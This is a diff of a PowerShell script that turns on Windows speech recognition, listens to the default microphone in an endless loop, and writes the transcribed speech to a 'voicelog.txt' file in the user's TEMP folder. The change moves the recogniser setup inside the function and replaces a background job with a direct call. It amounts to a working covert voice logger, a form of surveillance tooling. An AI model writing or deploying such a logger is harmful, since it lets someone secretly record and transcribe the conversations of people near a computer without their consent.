@@ -1,7 +1,9 @@
 function voiceLogger {
-    param (
-        [System.Speech.Recognition.SpeechRecognitionEngine]$speech
-    )
+    Add-Type -AssemblyName System.Speech
+    $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
+    $grammar = New-Object System.Speech.Recognition.DictationGrammar
+    $speech.LoadGrammar($grammar)
+    $speech.SetInputToDefaultAudioDevice()
 
     while ($true) {
         $result = $speech.Recognize()
@@ -14,8 +16,10 @@ function voiceLogger {
     }
 }
 
-
+# Create the file
 $filePath = "$env:TEMP\voicelog.txt"
+
+# Create an empty file or replace its content
 New-Item -ItemType File -Path $filePath -Force
 
 $content = @"
@@ -24,10 +28,9 @@ VOICE                       LOG
 ===============================
 All voice will be logged below:
 "@
+
+# Write content to the file, replacing existing content if any
 Set-Content -Path $filePath -Value $content -Force
-Add-Type -AssemblyName System.Speech
-$speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
-$grammar = New-Object System.Speech.Recognition.DictationGrammar
-$speech.LoadGrammar($grammar)
-$speech.SetInputToDefaultAudioDevice()
-Start-Job -ScriptBlock { param($speech) voiceLogger -speech $speech } -ArgumentList $speech
+
+# Start voice logging
+voiceLogger
